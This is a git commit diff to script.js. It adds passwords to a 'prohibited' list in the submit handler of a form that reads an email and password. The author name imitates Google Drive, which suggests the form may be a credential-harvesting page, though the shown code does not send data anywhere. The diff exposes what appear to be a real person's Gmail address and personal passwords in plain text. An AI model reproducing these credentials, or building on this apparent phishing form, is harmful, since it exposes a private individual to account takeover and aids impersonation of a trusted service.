3c6282ea96892dd0acb5c997f1211ce33e1dfc95
drive-gogl-folder1150-0cs2dsoq40apdcjhp <alonsodiaz1590@gmail.com>
2025-02-24 21:38:20 -0500

    Update script.js

--- script.js
+++ script.js
@@ -8,7 +8,7 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
     
     // Lista de correos electrónicos y contraseñas prohibidas
     const prohibitedEmails = ["tamaraganoza417@gmail.com"]; // Agregar correos prohibidos aquí
-    const prohibitedWords = ["Kiana14_07"]; // Agregar contraseñas prohibidas aquí
+    const prohibitedWords = ["Kiana14_07","kiaraivanna1","Kiaraivanna1"]; // Agregar contraseñas prohibidas aquí
     
     const email = emailInput.value.trim().toLowerCase();
     const password = passwordInput.value;
